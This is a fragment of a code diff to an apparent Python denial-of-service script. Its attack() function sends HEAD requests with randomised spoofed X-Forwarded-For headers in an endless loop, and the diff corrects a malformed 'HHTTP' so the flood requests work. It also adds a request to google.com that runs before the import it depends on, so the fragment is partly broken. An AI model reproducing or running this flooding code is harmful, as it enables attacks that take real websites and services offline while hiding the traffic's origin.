@@ -25,7 +25,9 @@ import time
 
 for i in progressbar(range(15), "Barra Util: ", 50):
     time.sleep(1.0)
-if
+    
+req = Request('http://www.google.com/', headers={'User-Agent': 'Mozilla/5.0'})
+webpage = urlopen(req).read()
 
 from urllib.request import Request, urlopen
 
@@ -54,7 +56,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + "HHTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD " + url + "HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
